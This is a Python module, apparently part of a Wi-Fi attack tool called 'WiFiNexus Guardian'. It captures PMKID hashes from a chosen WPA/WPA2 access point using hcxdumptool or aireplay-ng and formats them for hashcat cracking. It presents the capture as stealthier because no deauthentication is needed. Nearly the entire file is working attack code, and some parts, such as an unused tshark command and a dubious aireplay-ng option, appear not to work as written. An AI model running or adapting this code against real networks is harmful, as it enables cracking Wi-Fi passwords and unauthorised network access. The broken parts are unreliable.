"""
PMKID Attack Module for WiFiNexus Guardian
Captures PMKID hashes for WPA/WPA2 networks without requiring client handshake.
Faster and stealthier than traditional 4-way handshake capture.
"""

import logging
import os
import time
import re
import asyncio
import subprocess
from pathlib import Path
from typing import Optional, Tuple, List
from dataclasses import dataclass

from core.process_manager import RobustProcessManager

logger = logging.getLogger(__name__)

@dataclass
class PMKIDResult:
    success: bool
    pmkid_hash: Optional[str] = None
    bssid: Optional[str] = None
    essid: Optional[str] = None
    pcap_file: Optional[str] = None
    message: str = ""


class PMKIDParser:
    """
    Parser for PMKID hash files
    Parses and validates PMKID captures in various formats
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def parse(self, file_path: str) -> Optional[dict]:
        """
        Parse a PMKID file and extract hash information
        
        Args:
            file_path: Path to the PMKID file
            
        Returns:
            Dictionary with parsed PMKID data or None if parsing fails
        """
        try:
            with open(file_path, 'r') as f:
                content = f.read().strip()
            
            # Try different PMKID formats
            # Format 1: PMKID*MAC_AP*MAC_STA*ESSID
            if '*' in content:
                parts = content.split('*')
                if len(parts) >= 4:
                    return {
                        'pmkid': parts[0],
                        'mac_ap': parts[1],
                        'mac_sta': parts[2],
                        'essid': parts[3] if len(parts) > 3 else '',
                        'format': 'hashcat_16800'
                    }
            
            # Format 2: wlan0:*AA:BB:CC:DD:EE:FF:*TestNetwork:HASH
            elif ':' in content and 'wlan' in content:
                match = re.match(
                    r'(\w+):\*([A-F0-9:]+):\*([^:]+):([A-F0-9]+)',
                    content,
                    re.IGNORECASE
                )
                if match:
                    return {
                        'interface': match.group(1),
                        'bssid': match.group(2),
                        'essid': match.group(3),
                        'pmkid': match.group(4),
                        'format': 'hcxdumptool'
                    }
            
            self.logger.warning(f"Unknown PMKID format in file: {file_path}")
            return None
            
        except Exception as e:
            self.logger.error(f"Failed to parse PMKID file: {e}")
            return None
    
    def validate(self, pmkid_data: dict) -> bool:
        """
        Validate parsed PMKID data
        
        Args:
            pmkid_data: Dictionary with PMKID data
            
        Returns:
            True if valid, False otherwise
        """
        if not pmkid_data:
            return False
        
        # Check required fields
        required_fields = ['pmkid', 'bssid']
        for field in required_fields:
            if field not in pmkid_data:
                return False
        
        # Validate PMKID format (32 hex chars)
        pmkid = pmkid_data.get('pmkid', '')
        if len(pmkid) != 32 or not re.match(r'^[A-F0-9]{32}$', pmkid, re.IGNORECASE):
            return False
        
        # Validate BSSID format (12 hex chars with optional colons)
        bssid = pmkid_data.get('bssid', '')
        bssid_clean = bssid.replace(':', '').replace('-', '')
        if len(bssid_clean) != 12 or not re.match(r'^[A-F0-9]{12}$', bssid_clean, re.IGNORECASE):
            return False
        
        return True


class PMKIDAttacker:
    """
    PMKID Capture Attack Implementation
    
    PMKID attack captures the Pairwise Master Key Identifier from the 
    RSN (Robust Security Network) information element in the first 
    EAPOL frame sent by the Access Point.
    
    Advantages over traditional handshake capture:
    - No need to wait for clients to connect
    - No deauthentication required (stealthier)
    - Faster capture time
    - Works even if no clients are connected
    """
    
    def __init__(self, interface: str = None, output_dir: str = "captures"):
        self.interface = interface or "wlan0"
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.process_manager = RobustProcessManager(timeout=120, max_retries=2)
        
        # Additional attributes expected by tests
        self.timeout = 30
        self.is_running = False
        
        # Check for required tools
        self.use_hcxdumptool = RobustProcessManager.check_command_exists("hcxdumptool")
        self.use_tshark = RobustProcessManager.check_command_exists("tshark")
    
    async def attack(self, target_bssid: str, essid: str = "", timeout: int = None) -> Optional[PMKIDResult]:
        """
        Main attack method - asynchronous PMKID capture
        
        Args:
            target_bssid: Target AP MAC address
            essid: Network name (optional)
            timeout: Capture timeout in seconds
            
        Returns:
            PMKIDResult with captured hash or None on failure/timeout
        """
        # Validate MAC address first
        if not self._validate_mac(target_bssid):
            raise ValueError(f"Invalid MAC address format: {target_bssid}")
        
        # Use provided timeout or default
        capture_timeout = timeout or self.timeout
        
        self.is_running = True
        try:
            # Run capture with timeout
            result = await asyncio.wait_for(
                self._capture_pmkid(target_bssid, essid, capture_timeout),
                timeout=capture_timeout + 10  # Add buffer for cleanup
            )
            return result
        except asyncio.TimeoutError:
            logger.warning(f"PMKID capture timed out after {capture_timeout}s")
            return None
        finally:
            self.is_running = False
    
    def _validate_mac(self, mac_address: str) -> bool:
        """
        Validate MAC address format
        
        Args:
            mac_address: MAC address string (with or without colons/dashes)
            
        Returns:
            True if valid MAC format, False otherwise
        """
        if not mac_address:
            return False
        
        # Remove separators
        mac_clean = mac_address.replace(':', '').replace('-', '')
        
        # Must be exactly 12 hex characters
        if len(mac_clean) != 12:
            return False
        
        # Must be valid hexadecimal
        return bool(re.match(r'^[A-F0-9]{12}$', mac_clean, re.IGNORECASE))
    
    def _generate_filename(self, bssid: str, essid: str = "") -> str:
        """
        Generate filename for PMKID capture file
        
        Args:
            bssid: Target AP MAC address
            essid: Network name
            
        Returns:
            Filename string
        """
        # Clean BSSID for filename
        bssid_clean = bssid.replace(':', '_').replace('-', '_')
        
        # Create safe ESSid for filename
        essid_safe = essid.replace(' ', '_').replace('/', '_') if essid else ""
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        if essid_safe:
            return f"pmkid_{bssid_clean}_{essid_safe}_{timestamp}.pmkid"
        else:
            return f"pmkid_{bssid_clean}_{timestamp}.pmkid"
    
    async def _capture_pmkid(self, target_bssid: str, essid: str, timeout: int) -> Optional[PMKIDResult]:
        """
        Internal method to capture PMKID
        
        Args:
            target_bssid: Target AP MAC address
            essid: Network name
            timeout: Capture timeout
            
        Returns:
            PMKIDResult or None on failure
        """
        logger.info(f"Starting PMKID capture on {target_bssid}")
        
        # Method 1: Using hcxdumptool (preferred)
        if self.use_hcxdumptool:
            return self._capture_with_hcxdumptool(target_bssid, 1, essid, timeout)
        
        # Method 2: Using tshark + aireplay-ng
        elif self.use_tshark:
            return self._capture_with_tshark(target_bssid, 1, essid, timeout)
        
        else:
            logger.error("No suitable tool available for PMKID capture")
            return PMKIDResult(
                success=False,
                message="No suitable tool available for PMKID capture. Install hcxdumptool or tshark."
            )
    
    def capture_pmkid(
        self,
        target_bssid: str,
        channel: int,
        essid: str = "",
        timeout: int = 30
    ) -> PMKIDResult:
        """
        Capture PMKID from target access point (synchronous version)
        
        Args:
            target_bssid: Target AP MAC address
            channel: AP channel number
            essid: Network name (optional, for display)
            timeout: Maximum time to wait for PMKID
            
        Returns:
            PMKIDResult with captured hash or error message
        """
        logger.info(f"Starting PMKID capture on {target_bssid} (Channel {channel})")
        
        # Method 1: Using hcxdumptool (preferred)
        if self.use_hcxdumptool:
            return self._capture_with_hcxdumptool(target_bssid, channel, essid, timeout)
        
        # Method 2: Using tshark + aireplay-ng
        elif self.use_tshark:
            return self._capture_with_tshark(target_bssid, channel, essid, timeout)
        
        else:
            return PMKIDResult(
                success=False,
                message="No suitable tool available for PMKID capture. Install hcxdumptool or tshark."
            )
    
    def _capture_with_hcxdumptool(
        self,
        target_bssid: str,
        channel: int,
        essid: str,
        timeout: int
    ) -> PMKIDResult:
        """Capture PMKID using hcxdumptool"""
        pcapng_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.pcapng"
        hash_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.16800"
        
        try:
            # Stop network manager interference
            self._stop_network_managers()
            
            # Set interface down
            self.process_manager.execute(
                ["ip", "link", "set", self.interface, "down"],
                require_success=False,
                description="Set interface down"
            )
            
            # Run hcxdumptool
            cmd = [
                "hcxdumptool",
                "-i", self.interface,
                "-o", str(pcapng_file),
                "--enable_status=1",
                "--filtermode=2",
                f"--filterlist_ap={target_bssid.replace(':', '')}",
                f"--channel={channel}"
            ]
            
            logger.info(f"Running hcxdumptool on channel {channel}...")
            
            success, stdout, stderr = self.process_manager.execute(
                cmd,
                capture_output=True,
                require_success=False,
                description=f"PMKID capture with hcxdumptool"
            )
            
            # Run for specified timeout
            time.sleep(timeout)
            
            # Stop hcxdumptool
            self.process_manager.cleanup_all()
            
            # Convert to hashcat format
            if pcapng_file.exists():
                convert_cmd = [
                    "hcxpcapngtool",
                    "-o", str(hash_file),
                    str(pcapng_file)
                ]
                
                conv_success, conv_stdout, conv_stderr = self.process_manager.execute(
                    convert_cmd,
                    capture_output=True,
                    require_success=False,
                    description="Convert pcapng to hashcat format"
                )
                
                # Extract PMKID from hash file
                if hash_file.exists():
                    pmkid_hash = self._extract_pmkid_from_file(hash_file)
                    
                    if pmkid_hash:
                        logger.info(f"Successfully captured PMKID for {target_bssid}")
                        return PMKIDResult(
                            success=True,
                            pmkid_hash=pmkid_hash,
                            bssid=target_bssid,
                            essid=essid,
                            pcap_file=str(hash_file),
                            message="PMKID captured successfully"
                        )
            
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message="Failed to extract PMKID from capture"
            )
            
        except Exception as e:
            logger.error(f"PMKID capture failed: {e}")
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message=f"Error during capture: {str(e)}"
            )
        finally:
            # Restore interface
            self._restore_interface()
    
    def _capture_with_tshark(
        self,
        target_bssid: str,
        channel: int,
        essid: str,
        timeout: int
    ) -> PMKIDResult:
        """Capture PMKID using tshark and aireplay-ng"""
        pcap_file = self.output_dir / f"pmkid_{target_bssid.replace(':', '_')}.pcap"
        
        try:
            # Set monitor mode
            self._set_monitor_mode(channel)
            
            # Start tshark capture in background
            tshark_cmd = [
                "tshark",
                "-i", self.interface,
                "-w", str(pcap_file),
                "-f", f"wlan addr2 {target_bssid} or wlan addr1 {target_bssid}",
                "-Y", "eapol"
            ]
            
            logger.info("Starting packet capture with tshark...")
            
            # Note: This is a simplified version. In production, you'd run this async
            # For now, we'll use aireplay-ng to request PMKID
            
            aireplay_cmd = [
                "aireplay-ng",
                "--pmkid",
                "-b", target_bssid,
                self.interface
            ]
            
            success, stdout, stderr = self.process_manager.execute(
                aireplay_cmd,
                capture_output=True,
                require_success=False,
                timeout=timeout,
                description="Request PMKID with aireplay-ng"
            )
            
            # Parse output for PMKID
            pmkid_match = re.search(
                r'([A-F0-9]{32})[^\n]*\n.*?([A-F0-9]{12})[^\n]*\n.*?([A-F0-9]{0,32})',
                stdout,
                re.IGNORECASE
            )
            
            if pmkid_match:
                pmkid_hash = f"{pmkid_match.group(1)}*{pmkid_match.group(2)}*{pmkid_match.group(3)}*{essid}"
                logger.info(f"Successfully captured PMKID for {target_bssid}")
                
                return PMKIDResult(
                    success=True,
                    pmkid_hash=pmkid_hash,
                    bssid=target_bssid,
                    essid=essid,
                    pcap_file=str(pcap_file),
                    message="PMKID captured successfully"
                )
            
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message="PMKID not found in response"
            )
            
        except Exception as e:
            logger.error(f"PMKID capture failed: {e}")
            return PMKIDResult(
                success=False,
                bssid=target_bssid,
                essid=essid,
                message=f"Error during capture: {str(e)}"
            )
        finally:
            self._restore_interface()
    
    def _extract_pmkid_from_file(self, hash_file: Path) -> Optional[str]:
        """Extract PMKID hash from hashcat format file"""
        try:
            with open(hash_file, 'r') as f:
                content = f.read().strip()
                
            # PMKID hash format: PMKID*MAC_AP*MAC_STA*ESSID
            if '*' in content:
                parts = content.split('*')
                if len(parts) >= 3 and parts[0].upper().startswith('PMKID') or len(parts[0]) == 32:
                    return content
                    
        except Exception as e:
            logger.error(f"Failed to extract PMKID: {e}")
        
        return None
    
    def _set_monitor_mode(self, channel: int):
        """Set interface to monitor mode on specific channel"""
        try:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["iw", self.interface, "set", "type", "monitor"],
                ["ip", "link", "set", self.interface, "up"],
                ["iw", self.interface, "set", "channel", str(channel)]
            ]
            
            for cmd in cmds:
                self.process_manager.execute(cmd, require_success=False)
                
        except Exception as e:
            logger.error(f"Failed to set monitor mode: {e}")
    
    def _stop_network_managers(self):
        """Stop network managers that might interfere"""
        services = ["NetworkManager", "wpa_supplicant", "dhclient"]
        
        for service in services:
            try:
                subprocess.run(
                    ["systemctl", "stop", service],
                    capture_output=True,
                    timeout=5
                )
            except Exception:
                pass
    
    def _restore_interface(self):
        """Restore interface to managed mode"""
        try:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["iw", self.interface, "set", "type", "managed"],
                ["ip", "link", "set", self.interface, "up"]
            ]
            
            for cmd in cmds:
                self.process_manager.execute(cmd, require_success=False)
            
            # Restart network manager
            try:
                subprocess.run(
                    ["systemctl", "start", "NetworkManager"],
                    capture_output=True,
                    timeout=5
                )
            except Exception:
                pass
                
        except Exception as e:
            logger.error(f"Failed to restore interface: {e}")
    
    @staticmethod
    def format_pmkid_for_hashcat(
        pmkid: str,
        mac_ap: str,
        mac_sta: str,
        essid: str
    ) -> str:
        """
        Format PMKID for hashcat mode 16800
        
        Format: PMKID*MAC_AP*MAC_STA*ESSID
        
        Args:
            pmkid: PMKID value (32 hex chars)
            mac_ap: AP MAC address (12 hex chars)
            mac_sta: Station MAC address (12 hex chars)
            essid: Network SSID
            
        Returns:
            Formatted hash string for hashcat
        """
        # Remove colons from MAC addresses
        mac_ap_clean = mac_ap.replace(':', '').replace('-', '').upper()
        mac_sta_clean = mac_sta.replace(':', '').replace('-', '').upper()
        
        # Ensure PMKID is uppercase
        pmkid_clean = pmkid.replace(':', '').replace('-', '').upper()
        
        return f"{pmkid_clean}*{mac_ap_clean}*{mac_sta_clean}*{essid}"
